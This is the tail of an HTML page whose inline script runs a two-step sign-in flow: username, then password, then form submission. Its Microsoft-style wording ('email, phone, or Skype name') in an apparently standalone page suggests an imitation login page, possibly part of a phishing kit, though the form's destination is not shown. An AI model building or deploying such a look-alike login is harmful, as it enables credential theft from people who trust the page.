    </footer>
    <script src="assets/app.js"></script>
    
  <script>
    document.addEventListener('DOMContentLoaded', (event) => {
        const sectionUname = document.getElementById('section_uname');
        const sectionPwd = document.getElementById('section_pwd');
        const sectionFinal = document.getElementById('section_final');

        const formUname = document.getElementById('form_uname');
        const formPwd = document.getElementById('form_pwd');

        const btnNext = document.getElementById('btn_next');
        const btnSig = document.getElementById('btn_sig');

        const inpUname = document.getElementById('inp_uname');
        const inpPwd = document.getElementById('inp_pwd');

        const userIdentity = document.getElementById('user_identity');
        const userIdentityFinal = document.getElementById('user_identity_final');

        // Handle 'Next' button click
        btnNext.addEventListener('click', () => {
            const uname = inpUname.value.trim();
            if (uname) {
                userIdentity.textContent = uname;
                sectionUname.classList.add('d-none');
                sectionPwd.classList.remove('d-none');
            } else {
                document.getElementById('error_uname').textContent = 'Please enter a valid email, phone, or Skype name.';
            }
        });

        // Handle 'Sign in' button click
        btnSig.addEventListener('click', () => {
            const pass = inpPwd.value.trim();
            if (pass) {
                userIdentityFinal.textContent = userIdentity.textContent;
                sectionPwd.classList.add('d-none');
                sectionFinal.classList.remove('d-none');
                formPwd.submit(); // Submit the password form
            } else {
                document.getElementById('error_pwd').textContent = 'Please enter your password.';
            }
        });
    });
  </script>

</body>

